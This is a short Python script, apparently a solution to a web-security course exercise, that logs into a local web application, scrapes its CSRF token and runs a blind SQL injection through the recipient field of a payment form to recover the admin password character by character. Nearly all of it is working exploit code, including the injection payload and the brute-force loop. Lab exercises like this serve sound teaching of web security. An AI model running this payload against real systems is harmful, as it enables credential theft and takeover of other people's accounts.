from requests import codes, Session
import re

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"
csrf_token = None

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    pattern = r'<input type="hidden" name="csrf_token" value="([^"]+)">'
    match = re.search(pattern, response.text)
    # print(response.text)
    global csrf_token
    csrf_token = match.group(1) if match else None
    # print(f"CSRF Token: {csrf_token}")
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    # You may need to include CSRF token from Exercise 1.5 in the POST request below 
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "csrf_token": csrf_token
                    })
    return response.status_code == codes.ok

def sqli_attack(username):
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    password = '' 
    found = False
    while not found:
        found = True
        for char in "abcdefghijklmnopqrstuvwxyz":  # Iterate through each lowercase letter
            # Injection payload
            injection = f"' OR username='{username}' AND password LIKE '{password}{char}%' --"
            if submit_pay_form(sess, injection, 0):
                password += char
                found = False
                break 
    return password

def main():
    print(sqli_attack("admin"))

if __name__ == "__main__":
    main()
